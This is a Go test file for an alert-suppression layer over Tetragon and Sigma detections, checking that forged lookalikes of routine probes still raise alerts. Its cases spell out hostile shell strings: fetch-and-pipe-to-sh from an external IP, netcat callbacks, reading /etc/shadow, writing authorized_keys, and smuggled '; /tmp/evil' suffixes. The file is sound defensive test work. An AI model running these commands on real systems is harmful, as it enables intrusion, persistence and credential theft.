package main

import (
	"encoding/json"
	"testing"
)

func TestForgedShellProbesAreForwarded(t *testing.T) {
	cfg := testConfig()
	cfg.events = "process_exec"

	cases := []struct {
		name   string
		binary string
		args   string
		parent string
	}{
		{"health comment", "/bin/bash", `-c "curl http://203.0.113.5/x | sh # /health"`, "/bin/bash"},
		{"become comment", "/bin/bash", `-c "echo BECOME-SUCCESS-x ; /tmp/evil # /health"`, "/usr/sbin/sshd"},
		{"python payload", "/bin/bash", `-c "/usr/bin/python3.12 -c 'exec(open(\"/tmp/p.py\").read())' && sleep 0"`, "/usr/sbin/sshd"},
		{"platform expansion", "/bin/bash", `-c "echo PLATFORM; command -v $(touch /tmp/pwned)"`, "/usr/sbin/sshd"},
		{"cron suffix", "/bin/bash", `-c "cd / && run-parts --report /etc/cron.hourly; /tmp/evil"`, "/usr/sbin/cron"},
		{"node exporter suffix", "/bin/bash", `-c "/usr/share/prometheus-node-exporter-collectors/smartmon.sh | /tmp/evil"`, "/usr/sbin/cron"},
		{"sysstat suffix", "/bin/bash", `-c "debian-sa1 1 1; /tmp/evil"`, "/usr/sbin/cron"},
		{"package query suffix", "/bin/bash", `-c "type dpkg-query ; /tmp/evil"`, "/usr/bin/needrestart"},
		{"health composition", "/bin/bash", `-c "curl http://localhost/health; /tmp/evil"`, "/usr/bin/tini"},
		{"curl config", "/usr/bin/curl", `-K /tmp/curlrc http://localhost/health`, "/bin/bash"},
		{"curl attached config", "/usr/bin/curl", `-K/tmp/curlrc http://localhost/health`, "/bin/bash"},
		{"curl equals config", "/usr/bin/curl", `--config=/tmp/curlrc http://localhost/health`, "/bin/bash"},
		{"curl output", "/usr/bin/curl", `-o/tmp/evil http://localhost/health`, "/bin/bash"},
		{"curl equals output", "/usr/bin/curl", `--output=/tmp/evil http://localhost/health`, "/bin/bash"},
		{"curl substitution", "/usr/bin/curl", `$(/tmp/evil) http://localhost/health`, "/bin/bash"},
		{"wget execute", "/usr/bin/wget", `-e http_proxy=127.0.0.1:3128 http://localhost/health`, "/bin/bash"},
		{"wget attached execute", "/usr/bin/wget", `--execute=http_proxy=127.0.0.1:3128 http://localhost/health`, "/bin/bash"},
		{"false composition", "/bin/bash", `-c "false; /tmp/evil"`, "/usr/bin/tini"},
		{"false substitution", "/bin/bash", `-c "false $(/tmp/evil)"`, "/usr/bin/tini"},
		{"grpc addr suffix", "/bin/bash", `-c "/usr/local/bin/grpc_health_probe -addr 127.0.0.1.evil:443"`, "/usr/bin/tini"},
		{"grpc external addr", "/bin/bash", `-c "/usr/local/bin/grpc_health_probe -addr=203.0.113.5:443"`, "/usr/bin/tini"},
		{"redis unix socket", "/bin/bash", `-c "redis-cli -s /run/incus.sock ping"`, "/usr/bin/tini"},
		{"redis attached socket", "/bin/bash", `-c "redis-cli -s/run/incus.sock ping"`, "/usr/bin/tini"},
		{"redis attached host", "/bin/bash", `-c "redis-cli -h203.0.113.5 ping"`, "/usr/bin/tini"},
		{"pg attached host", "/bin/bash", `-c "pg_isready -h203.0.113.5"`, "/usr/bin/tini"},
		{"mc config dir", "/bin/bash", `-c "mc --config-dir /tmp ready foo"`, "/usr/bin/tini"},
		{"ansible mkdir suffix", "/bin/bash", `-c "( umask 077 && mkdir -p /root/.ansible/tmp/ansible-tmp-x;/tmp/evil )"`, "/usr/bin/bash"},
		{"node exporter sponge expansion", "/bin/bash", `-c "/usr/share/prometheus-node-exporter-collectors/smartmon.sh | sponge $(/tmp/evil)"`, "/usr/sbin/cron"},
		{"mixed loopback urls", "/usr/bin/curl", `http://203.0.113.5/x http://localhost/`, "/bin/bash"},
		{"local file url", "/usr/bin/curl", `file://localhost/etc/shadow`, "/bin/bash"},
		{"curl from tmp", "/tmp/curl", `http://localhost/health`, "/bin/bash"},
		{"resolve redirect", "/usr/bin/curl", `--resolve localhost:80:203.0.113.5 http://localhost/health`, "/bin/bash"},
		{"proxy redirect", "/usr/bin/curl", `-x http://127.0.0.1:3128 http://localhost/health`, "/bin/bash"},
		{"unix socket pivot", "/usr/bin/curl", `--unix-socket /run/incus.sock http://localhost/1.0/instances`, "/bin/bash"},
		{"netcat under runtime parent", "/bin/bash", `-c "nc 203.0.113.5 4444"`, "/usr/bin/tini"},
		{"redis cli from tmp", "/bin/bash", `-c "/tmp/redis-cli -a x ping"`, "/usr/bin/tini"},
		{"curl clustered output", "/usr/bin/curl", `-so /tmp/payload http://localhost/health`, "/bin/bash"},
		{"curl clustered config", "/usr/bin/curl", `-sK /tmp/curlrc http://localhost/health`, "/bin/bash"},
		{"wget clustered output", "/usr/bin/wget", `-qO /tmp/payload http://localhost/health`, "/bin/bash"},
		{"newline payload", "/bin/bash", "-c \"curl http://localhost/health\n/opt/evil\"", "/usr/bin/tini"},
		{"sponge elsewhere", "/bin/bash", `-c "/usr/share/prometheus-node-exporter-collectors/smartmon.sh | sponge /root/.ssh/authorized_keys"`, "/usr/sbin/cron"},
		{"snap shell", "/usr/bin/snap", `run --shell microceph.log-rotate`, "/usr/lib/systemd/systemd"},
		{"sudo payload", "/usr/bin/sudo", `-H -S -n -u root /bin/sh -c "echo BECOME-SUCCESS-x ; /usr/bin/python3 /tmp/evil"`, "/usr/sbin/sshd"},
		{"sudo from tmp", "/tmp/sudo", `-H -S -n -u root /bin/sh -c "echo BECOME-SUCCESS-x ; /usr/bin/python3"`, "/usr/sbin/sshd"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			line := execLine(t, tc.binary, tc.args, tc.parent)
			_, _, ok, reason := tetragonAlertDecision(line, cfg)
			if !ok {
				t.Fatalf("forged probe was suppressed as %q", reason)
			}
		})
	}
}

func TestForgedBridgeGuardModuleIsForwarded(t *testing.T) {
	cfg := testConfig()
	cfg.events = "process_kprobe"

	cases := []struct {
		name   string
		binary string
		args   string
	}{
		{"insmod", "/sbin/insmod", "-q -- nf_conntrack_bridge"},
		{"modprobe from tmp", "/tmp/modprobe", "-q -- nf_conntrack_bridge"},
		{"extra module", "/sbin/modprobe", "-q -- usb_storage nf_conntrack_bridge"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			line := privilegeLineUID(t, "kernel-modules", "security_kernel_module_request",
				tc.binary, tc.args, 0)
			if _, _, ok, reason := tetragonAlertDecision(line, cfg); !ok {
				t.Fatalf("module load was suppressed as %q", reason)
			}
		})
	}
}

func TestContainerPackageMaintenanceDoesNotHideLateral(t *testing.T) {
	cfg := testConfig()
	cfg.events = "process_kprobe"
	line := `{"process_kprobe":{"function_name":"tcp_connect","process":{"binary":"/usr/bin/apt-get","arguments":"update","uid":1000000},"args":[{"sock_arg":{"daddr":"10.0.0.12","dport":2381}}]}}`
	if _, _, ok, reason := tetragonAlertDecision(line, cfg); !ok {
		t.Fatalf("container apt-get connect was suppressed as %q", reason)
	}
}

func TestPackageMaintenanceDoesNotTrustACommentedScript(t *testing.T) {
	body := &tetragonLog{Process: tetragonProcess{
		Binary:    "/usr/bin/python3",
		Arguments: "/tmp/payload.py /usr/lib/ubuntu-advantage/esm_cache.py",
	}}
	if reason := packageMaintenanceReason(body); reason != "" {
		t.Fatalf("later-argument script was suppressed as %q", reason)
	}
	forged := &tetragonLog{Process: tetragonProcess{
		Binary:    "/tmp/apt-get",
		Arguments: "update",
	}}
	if reason := packageMaintenanceReason(forged); reason != "" {
		t.Fatalf("forged apt-get was suppressed as %q", reason)
	}
}

func TestPackageMaintenanceUsesTheSubcommandPosition(t *testing.T) {
	cases := []struct {
		args string
		want string
	}{
		{"-o DPkg::Lock::Timeout=300 update", "package_update"},
		{"install evil update", ""},
		{"remove update", ""},
		{"update -o APT::Update::Pre-Invoke::=/tmp/evil", ""},
		{"-c /tmp/apt.conf update", ""},
		{"-c/tmp/apt.conf update", ""},
		{"--config-file=/tmp/apt.conf update", ""},
	}
	for _, tc := range cases {
		body := &tetragonLog{Process: tetragonProcess{Binary: "/usr/bin/apt-get", Arguments: tc.args}}
		if got := packageMaintenanceReason(body); got != tc.want {
			t.Fatalf("apt-get %q = %q, want %q", tc.args, got, tc.want)
		}
	}
}

func TestForgedFileWritersAreForwarded(t *testing.T) {
	cfg := testConfig()
	cfg.events = "process_kprobe"
	cases := []struct {
		binary string
		args   string
		path   string
	}{
		{"/tmp/pmiectl", "-m check", "/etc/pcp/pmie/lock"},
		{"/tmp/pmlogctl", "-m check", "/etc/pcp/pmlogger/lock"},
		{"/tmp/iptables-save", "", "/etc/iptables/rules.v4"},
		{"/bin/install", "", "/etc/verifyrestore/start.conf"},
		{"/tmp/install", "", "/var/lib/postgresql/16/verifyrestore/pg_hba.conf"},
		{"/tmp/evil", "16 verifyrestore", "/var/lib/postgresql/16/verifyrestore/x"},
		{"/usr/bin/python3", "16 verifyrestore", "/etc/postgresql/16/verifyrestore/x"},
		{"/bin/install", "", "/var/lib/postgresql/16/foo/verifyrestore/x"},
	}
	for _, tc := range cases {
		line := fileWriteLine(t, tc.binary, tc.args, tc.path)
		if _, _, ok, reason := tetragonAlertDecision(line, cfg); !ok {
			t.Fatalf("%s writing %s was suppressed as %q", tc.binary, tc.path, reason)
		}
	}
}

func TestUnverifiedUserScopeCannotUseHostSuppressions(t *testing.T) {
	root := t.TempDir()
	pid := uint32(9101)
	started := writeFakeProcess(t, root, pid,
		"0::/user.slice/user-1000.slice/user@1000.service/app.slice/libpod-"+dockerID+".scope\n")
	old := procRoot
	procRoot = root
	defer func() { procRoot = old }()

	body := &tetragonLog{
		FunctionName: "tcp_connect",
		Process: tetragonProcess{
			PID:       pid,
			StartTime: started,
			Binary:    "/usr/bin/etcdctl",
			Arguments: "get /cluster/leader",
		},
	}
	body.Args, _ = json.Marshal([]any{map[string]any{
		"sock_arg": map[string]any{"daddr": "10.0.0.12", "dport": 2381},
	}})

	layer, _ := tetragonEventLayer(body)
	if layer != "unverified" {
		t.Fatalf("layer = %q, want unverified", layer)
	}
	if reason := tetragonSuppression("process_kprobe", body, layer); reason != "" {
		t.Fatalf("private cluster connect was suppressed as %q", reason)
	}

	for _, dst := range []struct {
		host string
		port int
	}{{"127.0.0.1", 9093}, {"10.100.0.5", 22}} {
		body.Args, _ = json.Marshal([]any{map[string]any{
			"sock_arg": map[string]any{"daddr": dst.host, "dport": dst.port},
		}})
		if reason := tetragonSuppression("process_kprobe", body, layer); reason != "" {
			t.Fatalf("unverified %s:%d was suppressed as %q", dst.host, dst.port, reason)
		}
	}

	body.Args, _ = json.Marshal([]any{map[string]any{
		"sock_arg": map[string]any{"daddr": "203.0.113.5", "dport": 443},
	}})
	if reason := tetragonSuppression("process_kprobe", body, layer); reason != "tenant_egress" {
		t.Fatalf("public egress reason = %q, want tenant_egress", reason)
	}

	body.FunctionName = ""
	body.Process.Binary = "/bin/bash"
	body.Process.Arguments = `-c "id"`
	if reason := tetragonSuppression("process_exec", body, layer); reason != "" {
		t.Fatalf("unverified exec was suppressed as %q", reason)
	}
}

func TestLoopbackProbeAllowsDevNullOutput(t *testing.T) {
	cfg := testConfig()
	cfg.events = "process_exec"
	line := execLine(t, "/bin/sh", `-c "curl -s -o /dev/null http://localhost/health"`, "/usr/bin/tini")
	if _, _, ok, reason := tetragonAlertDecision(line, cfg); ok {
		t.Fatalf("legitimate /dev/null probe was forwarded as %q", reason)
	}
}

// Only keepalived's storage-VIP script may run curl and be treated as
// routine. A direct curl or wget with a loopback URL is an ordinary exec,
// even when the arguments look like a probe.
func TestDirectCurlLoopbackIsNotRoutine(t *testing.T) {
	cfg := testConfig()
	cfg.events = "process_exec"

	line := execLine(t, "/usr/bin/curl", `-f -s http://localhost:5000/v2/`,
		"/usr/local/lib/cluster/check-storage-vip-health")
	if _, _, ok, reason := tetragonAlertDecision(line, cfg); ok {
		t.Fatalf("keepalived VIP probe was forwarded as %q", reason)
	}

	forged := []struct {
		name   string
		binary string
		args   string
		parent string
	}{
		{"curl from a shell", "/usr/bin/curl", `-f -s http://localhost:5000/v2/`, "/bin/bash"},
		{"curl from tmp", "/tmp/curl", `-f -s http://localhost:5000/v2/`,
			"/usr/local/lib/cluster/check-storage-vip-health"},
		{"wget from the VIP script", "/usr/bin/wget", `-f -s http://localhost:5000/v2/`,
			"/usr/local/lib/cluster/check-storage-vip-health"},
		{"curl different path", "/usr/bin/curl", `-f -s http://localhost:5000/`,
			"/usr/local/lib/cluster/check-storage-vip-health"},
		{"curl lookalike parent", "/usr/bin/curl", `-f -s http://localhost:5000/v2/`,
			"/tmp/check-storage-vip-health"},
		{"shell loopback probe", "/bin/bash", `-c "curl -s http://localhost/health"`, "/usr/sbin/sshd"},
	}
	for _, tc := range forged {
		t.Run(tc.name, func(t *testing.T) {
			line := execLine(t, tc.binary, tc.args, tc.parent)
			if _, _, ok, reason := tetragonAlertDecision(line, cfg); !ok {
				t.Fatalf("direct curl/wget was suppressed as %q", reason)
			}
		})
	}
}

// A resolved host process must keep the host layer even when it runs as a
// non-root service account. The uid fallback is only for processes /proc no
// longer knows.
func TestResolvedHostProcessIsNotUnverified(t *testing.T) {
	root := t.TempDir()
	pid := uint32(9201)
	started := writeFakeProcess(t, root, pid, "0::/system.slice/admin-api.service\n")
	old := procRoot
	procRoot = root
	defer func() { procRoot = old }()

	body := &tetragonLog{Process: tetragonProcess{
		PID: pid, UID: 993, StartTime: started, Binary: "/usr/bin/python3.12",
	}}
	if layer, _ := tetragonEventLayer(body); layer != "host" {
		t.Fatalf("resolved non-root host process layer = %q, want host", layer)
	}

	// The same shape with no /proc entry is the dead-process case. A login uid
	// stays conservative because it could be a rootless container.
	dead := &tetragonLog{Process: tetragonProcess{
		PID: pid + 1, UID: 1000, StartTime: started, Binary: "/usr/bin/python3.12",
	}}
	if layer, _ := tetragonEventLayer(dead); layer != "unverified" {
		t.Fatalf("dead login-uid process layer = %q, want unverified", layer)
	}
	// A dead system account is a host service: `_apt` runs apt helpers and
	// exits before the event is classified.
	deadSystem := &tetragonLog{Process: tetragonProcess{
		PID: pid + 2, UID: 42, StartTime: started, Binary: "/usr/bin/dpkg",
	}}
	if layer, _ := tetragonEventLayer(deadSystem); layer != "host" {
		t.Fatalf("dead system-account process layer = %q, want host", layer)
	}
}

func TestObservedAnsibleProbeShapesAreSuppressed(t *testing.T) {
	cfg := testConfig()
	cfg.events = "process_exec"

	const tmpID = "1794263847.2121468-1496144-51989675485718"
	cases := []struct {
		name   string
		binary string
		args   string
		parent string
	}{
		{
			name:   "nested become outer shell",
			binary: "/bin/bash",
			args:   `-c "/bin/sh -c 'sudo -H -S -n -u root /bin/sh -c '"'"'echo BECOME-SUCCESS-uhfrkxakcyykeigfesyooukddqjchawm ; /usr/bin/python3'"'"' && sleep 0'"`,
			parent: "/usr/sbin/sshd",
		},
		{
			name:   "nested become inner shell",
			binary: "/bin/sh",
			args:   `-c "sudo -H -S -n -u root /bin/sh -c 'echo BECOME-SUCCESS-uhfrkxakcyykeigfesyooukddqjchawm ; /usr/bin/python3' && sleep 0"`,
			parent: "/usr/sbin/sshd",
		},
		{
			name:   "nested platform probe",
			binary: "/bin/bash",
			args:   `-c "/bin/sh -c 'echo PLATFORM; uname; echo FOUND; command -v '"'"'python3.12'"'"'; echo ENDFOUND && sleep 0'"`,
			parent: "/usr/sbin/sshd",
		},
		{
			name:   "expanded temp directory",
			binary: "/bin/sh",
			args:   `-c "( umask 77 && mkdir -p "` + "`" + ` echo /root/.ansible/tmp ` + "`" + `"&& mkdir "` + "`" + ` echo /root/.ansible/tmp/ansible-tmp-` + tmpID + ` ` + "`" + `" && echo ansible-tmp-` + tmpID + `="` + "`" + ` echo /root/.ansible/tmp/ansible-tmp-` + tmpID + ` ` + "`" + `" ) && sleep 0"`,
			parent: "/usr/sbin/sshd",
		},
		{
			name:   "temp directory cleanup",
			binary: "/bin/bash",
			args:   `-c "/bin/sh -c 'rm -f -r /root/.ansible/tmp/ansible-tmp-` + tmpID + `/ > /dev/null 2>&1 && sleep 0'"`,
			parent: "/usr/sbin/sshd",
		},
		{
			name:   "temp directory chmod",
			binary: "/bin/bash",
			args:   `-c "/bin/sh -c 'chmod u+x /root/.ansible/tmp/ansible-tmp-` + tmpID + `/ /root/.ansible/tmp/ansible-tmp-` + tmpID + `/source && sleep 0'"`,
			parent: "/usr/sbin/sshd",
		},
		{
			name:   "motd run-parts with redirect",
			binary: "/bin/sh",
			args:   `-c -- "/usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new"`,
			parent: "/usr/sbin/sshd",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			line := execLine(t, tc.binary, tc.args, tc.parent)
			if _, _, ok, reason := tetragonAlertDecision(line, cfg); ok {
				t.Fatalf("observed probe shape was forwarded as %q", reason)
			}
		})
	}

	forged := []struct {
		name   string
		binary string
		args   string
	}{
		{"nested become payload", "/bin/bash", `-c "/bin/sh -c 'sudo -H -S -n -u root /bin/sh -c '"'"'echo BECOME-SUCCESS-x ; /tmp/evil'"'"' && sleep 0'"`},
		{"expanded temp directory injection", "/bin/sh", `-c "( umask 77 && mkdir -p "` + "`" + ` echo /root/.ansible/tmp ` + "`" + `"&& mkdir /tmp/evil && echo ansible-tmp-x=/tmp/evil )"`},
		{"cleanup with payload", "/bin/sh", `-c "rm -f -r /root/.ansible/tmp/ansible-tmp-` + tmpID + `/ > /dev/null 2>&1; /tmp/evil"`},
		{"motd payload", "/bin/sh", `-c -- "/usr/bin/env -i PATH=/usr/bin run-parts --lsbsysinit /etc/update-motd.d; /tmp/evil"`},
	}
	for _, tc := range forged {
		t.Run(tc.name, func(t *testing.T) {
			line := execLine(t, tc.binary, tc.args, "/usr/sbin/sshd")
			if _, _, ok, reason := tetragonAlertDecision(line, cfg); !ok {
				t.Fatalf("forged probe was suppressed as %q", reason)
			}
		})
	}
}

func TestAnsibleProbeNeedsARootInvoker(t *testing.T) {
	cfg := testConfig()
	cfg.events = "process_exec"
	become := `-H -S -n -u root /bin/sh -c "echo BECOME-SUCCESS-abc123 ; /usr/bin/python3"`

	// The exact argv matches, but a login account typed it: the escalation
	// must survive, or the only paging class has a documented bypass.
	line, err := json.Marshal(map[string]any{
		"process_exec": map[string]any{
			"process": map[string]any{
				"pid": 900, "uid": 0, "binary": "/usr/bin/sudo", "arguments": become,
			},
			"parent": map[string]any{"pid": 42, "uid": 2000, "binary": "/bin/bash"},
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	a, _, ok, reason := tetragonAlertDecision(string(line), cfg)
	if !ok {
		t.Fatalf("a non-root invoker's become shape was suppressed as %q", reason)
	}
	if a.Labels["escalation"] != "nonroot" {
		t.Fatalf("escalation label = %q, want nonroot", a.Labels["escalation"])
	}

	// The same shell probe from a non-root parent is not routine either.
	probe, err := json.Marshal(map[string]any{
		"process_exec": map[string]any{
			"process": map[string]any{
				"pid": 901, "uid": 2000, "binary": "/bin/sh",
				"arguments": `-c "( umask 77 && mkdir -p /root/.ansible/tmp ) && sleep 0"`,
			},
			"parent": map[string]any{"pid": 42, "uid": 2000, "binary": "/bin/bash"},
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	if _, _, ok, reason := tetragonAlertDecision(string(probe), cfg); !ok {
		t.Fatalf("a non-root invoker's shell probe was suppressed as %q", reason)
	}
}

func TestRoutineDesktopAndMaintenanceShapesAreSuppressed(t *testing.T) {
	cfg := testConfig()
	cfg.events = "process_exec"

	cases := []struct {
		name   string
		binary string
		args   string
		parent string
		reason string
	}{
		{"snap desktop integration", "/snap/snapd/current/usr/bin/snap", "run snapd-desktop-integration", "/usr/lib/systemd/systemd", "desktop"},
		{"cups logrotate restart", "/bin/sh", "-c \"\n\t\tinvoke-rc.d --quiet cups restart > /dev/null\n\" logrotate_script \"/var/log/cups/*log \"", "/usr/sbin/logrotate", "cron"},
		{"daily dpkg backup", "/etc/cron.daily/dpkg", "/etc/cron.daily/dpkg", "/usr/sbin/cron", "cron"},
		{"dpkg package status", "/usr/bin/dpkg", "--status tailscale", "/usr/bin/tailscale", "package_query"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			line := execLine(t, tc.binary, tc.args, tc.parent)
			_, _, ok, reason := tetragonAlertDecision(line, cfg)
			if ok {
				t.Fatal("routine shape was forwarded")
			}
			if reason != tc.reason {
				t.Fatalf("reason = %q, want %q", reason, tc.reason)
			}
		})
	}

	forged := []struct {
		name   string
		binary string
		args   string
		parent string
	}{
		{"snap desktop lookalike", "/snap/snapd/current/usr/bin/snap", "run --shell microceph.log-rotate", "/usr/lib/systemd/systemd"},
		{"cups restart payload", "/bin/sh", "-c \"\n\t\tinvoke-rc.d --quiet cups restart > /dev/null; /tmp/evil\n\" logrotate_script \"/var/log/cups/*log \"", "/usr/sbin/logrotate"},
		{"other service restart", "/bin/sh", "-c \"\n\t\tinvoke-rc.d --quiet nginx restart > /dev/null\n\" logrotate_script \"/var/log/cups/*log \"", "/usr/sbin/logrotate"},
		{"dpkg status payload", "/usr/bin/dpkg", "--status tailscale; /tmp/evil", "/usr/bin/tailscale"},
	}
	for _, tc := range forged {
		t.Run(tc.name, func(t *testing.T) {
			line := execLine(t, tc.binary, tc.args, tc.parent)
			if _, _, ok, reason := tetragonAlertDecision(line, cfg); !ok {
				t.Fatalf("forged shape was suppressed as %q", reason)
			}
		})
	}
}

func TestCertbotPrivilegeDropIsSuppressed(t *testing.T) {
	cfg := testConfig()
	cfg.events = "process_kprobe"

	line := privilegeArgsLine(t, "privilege-raises", "__sys_setfsuid",
		"/usr/bin/certbot", "/usr/bin/certbot -q renew --no-random-sleep-on-renew")
	_, _, ok, reason := tetragonAlertDecision(line, cfg)
	if ok {
		t.Fatal("certbot renew privilege transition was forwarded")
	}
	if reason != "expected_privilege" {
		t.Fatalf("reason = %q, want expected_privilege", reason)
	}

	forged := []struct {
		name   string
		binary string
		args   string
	}{
		{"certbot from tmp", "/tmp/certbot", "/tmp/certbot -q renew --no-random-sleep-on-renew"},
		{"certbot with a hook", "/usr/bin/certbot", "/usr/bin/certbot renew --deploy-hook /tmp/evil"},
	}
	for _, tc := range forged {
		t.Run(tc.name, func(t *testing.T) {
			line := privilegeArgsLine(t, "privilege-raises", "__sys_setfsuid", tc.binary, tc.args)
			if _, _, ok, reason := tetragonAlertDecision(line, cfg); !ok {
				t.Fatalf("forged certbot shape was suppressed as %q", reason)
			}
		})
	}
}

func TestPublicEgressIsRoutine(t *testing.T) {
	proc := tetragonProcess{
		Binary:    "/usr/bin/wget",
		Arguments: "--no-config --connect-timeout=7 --tries=1 --dns-timeout=7 -q --header=Metadata-Flavor:Google -O - http://metadata.google.internal/computeMetadata/v1/instance/id",
	}
	if reason := routineExecReason(proc, nil); reason != "public_egress" {
		t.Fatalf("public fetch = %q, want public_egress", reason)
	}

	version := proc
	version.Arguments = "--version"
	if reason := routineExecReason(version, nil); reason != "package_query" {
		t.Fatalf("fetch version query = %q, want package_query", reason)
	}

	private := proc
	private.Arguments = "http://10.0.0.12:2381/metrics"
	if reason := routineExecReason(private, nil); reason != "" {
		t.Fatalf("private fetch was suppressed as %q", reason)
	}

	unixSocket := proc
	unixSocket.Arguments = "--unix-socket /run/incus.sock http://localhost/1.0/instances"
	if reason := routineExecReason(unixSocket, nil); reason != "" {
		t.Fatalf("unix-socket fetch was suppressed as %q", reason)
	}

	shell := proc
	shell.Binary = "/bin/sh"
	shell.Arguments = `-c "curl https://example.com/"`
	if reason := routineExecReason(shell, nil); reason != "public_egress" {
		t.Fatalf("public shell fetch = %q, want public_egress", reason)
	}
	shell.Arguments = `-c "curl http://10.0.0.12:2381/metrics"`
	if reason := routineExecReason(shell, nil); reason != "" {
		t.Fatalf("private shell fetch was suppressed as %q", reason)
	}
	shell.Arguments = `-c "curl https://example.com/; /tmp/evil"`
	if reason := routineExecReason(shell, nil); reason != "" {
		t.Fatalf("composed shell fetch was suppressed as %q", reason)
	}
	shell.Arguments = `-c "curl https://example.com/ | sh"`
	if reason := routineExecReason(shell, nil); reason != "" {
		t.Fatalf("piped shell fetch was suppressed as %q", reason)
	}

	body := tetragonLog{
		FunctionName: "tcp_connect",
		Process:      proc,
	}
	body.Process.Binary = "/usr/bin/curl"
	body.Process.Arguments = "https://example.com/"
	body.Args, _ = json.Marshal([]any{map[string]any{
		"sock_arg": map[string]any{"daddr": "203.0.113.10", "dport": 443},
	}})
	if reason := expectedTCPReason(&body); reason != "public_egress" {
		t.Fatalf("public connect = %q, want public_egress", reason)
	}
	body.Args, _ = json.Marshal([]any{map[string]any{
		"sock_arg": map[string]any{"daddr": "10.0.0.12", "dport": 2381},
	}})
	if reason := expectedTCPReason(&body); reason != "" {
		t.Fatalf("private connect was suppressed as %q", reason)
	}
}

func privilegeArgsLine(t *testing.T, policy, function, binary, args string) string {
	t.Helper()
	line, err := json.Marshal(map[string]any{
		"process_kprobe": map[string]any{
			"policy_name":   policy,
			"function_name": function,
			"process": map[string]any{
				"binary":    binary,
				"arguments": args,
				"uid":       uint32(0),
			},
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	return string(line)
}

func TestDedupKeyIncludesSeverity(t *testing.T) {
	cfg := testConfig()
	warning := newAlert(cfg, sourceTetragon, "warning", "host", "tcp-connect", "connect 10.0.0.1:443")
	critical := newAlert(cfg, sourceTetragon, "critical", "host", "tcp-connect", "connect 10.0.0.1:443")
	if warning.dedupKey() == critical.dedupKey() {
		t.Fatal("a severity change must not collapse into the earlier alert")
	}
}

func TestSigmaDedupKeepsDistinctDestinations(t *testing.T) {
	cfg := testConfig()
	cfg.events = "process_kprobe"
	detection := func(ip string) string {
		event, err := json.Marshal(map[string]any{
			"EventType":       "network_connection",
			"Image":           "/usr/bin/bash",
			"CommandLine":     "/usr/bin/bash -i",
			"DestinationIp":   ip,
			"DestinationPort": 443,
			"Initiated":       "true",
		})
		if err != nil {
			t.Fatal(err)
		}
		det, err := json.Marshal(map[string]any{
			"rule_title": "Linux Reverse Shell Indicator",
			"rule_id":    "rule-reverse-shell",
			"level":      "high",
			"event":      json.RawMessage(event),
		})
		if err != nil {
			t.Fatal(err)
		}
		return string(det)
	}

	first, ok := sigmaDetectionToAlert(detection("203.0.113.10"), cfg)
	if !ok {
		t.Fatal("first detection was not mapped")
	}
	second, ok := sigmaDetectionToAlert(detection("203.0.113.11"), cfg)
	if !ok {
		t.Fatal("second detection was not mapped")
	}
	if first.dedupKey() == second.dedupKey() {
		t.Fatal("two callback destinations on the same port collapsed")
	}
}
